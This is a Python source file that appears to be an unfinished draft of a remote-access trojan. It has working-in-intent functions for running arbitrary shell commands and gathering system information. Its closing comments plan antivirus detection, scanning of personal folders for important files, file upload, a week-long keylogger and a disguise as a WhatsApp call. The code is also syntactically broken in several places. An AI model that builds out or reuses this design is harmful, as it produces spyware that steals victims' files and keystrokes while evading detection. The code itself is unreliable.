#could become the main joining glue and basic function
import os
import sys
import subprocess
import platform
import psutil //required to install stuff
'''
executeshell func executes the code and returns back the output
'''
#write function to recieve output from multiline code

def execute_shell_command(command: str) -> str:
    try:
        result = subprocess.run(command, shell = True, capture_output=True, text=True,errors='ignore')
        if not output:
            return "command was executed correctly but output did not come through \n"
        return output
    except FileNotFoundError:
        return f"Error: command '{command} not found \n'"
    except Exception as e:
        return f"an error occured while executing the command: {e} \n"
#changes directory
def chDIR(path: str) -> str:
    try:
        os.chdir(path)
        return f"changed directory to {os.getcwd()} \n"
    except FileNotfoundError:
        return f"the directory '{path} does not exist. \n'"
    except Exception as e:
        return f"an error occured {e} \n"
#gets system info in bulk maybe can change setting to see if you want in bulk or not
def get_sys_info() -> str:
    info = {
            "Platform": sys.platform,
            "System": platform.system(),
            "Node Name": platform.node(),
            "Release": platform.release(),
            "Version": platform.version(),
            "Machine": platform.machine(),
            "Processor": platform.processor()
            "current Directory": os.getcwd()
            }
    return "\n".join([f"{key}:{value}" for key, value in info.items()]) + "\n"



""" write a system metric fetcher ie fetches real time collected recorded metric of ysstem resource usage"""
#if windows then also use winapi
#detect antivirus
def detect_antivirus():

#detect important files by scanning in document downloads desktop excessively opened file
#upload file maker
#keylogger no direct transfer record for a week or time period and interact with it
#disguise as a whatsapp calll or something
